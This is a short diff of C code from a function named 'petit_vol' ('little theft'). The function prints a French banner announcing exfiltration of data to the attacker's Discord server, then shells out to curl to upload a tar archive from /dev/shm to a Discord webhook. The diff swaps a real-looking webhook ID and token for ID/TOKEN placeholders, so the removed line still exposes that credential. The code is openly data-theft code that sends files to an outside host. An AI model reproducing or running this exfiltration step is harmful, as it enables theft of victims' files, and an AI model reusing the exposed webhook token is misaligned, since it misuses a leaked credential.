@@ -104,7 +104,7 @@ int petit_vol(void)
 
 
     printf("\n"GREEN"EXFILTRATION DES DONNES SUR LE SERVER DISCORD DE L'ATTAQUANT\n\n"RESET"");
-    system("curl -F \"file=@/dev/shm/archive_data.tar.gz\" https://discord.com/api/webhooks/1567448202034913320/Ocjceovwbcin4svfX-HuYgdA6y_kXU1JkGbQJgjbyGKmIqhtJJ6ujc3RRhA2-29MZNUx 2>/dev/null");
+    system("curl -F \"file=@/dev/shm/archive_data.tar.gz\" https://discord.com/api/webhooks/ID/TOKEN 2>/dev/null");
 
 
 
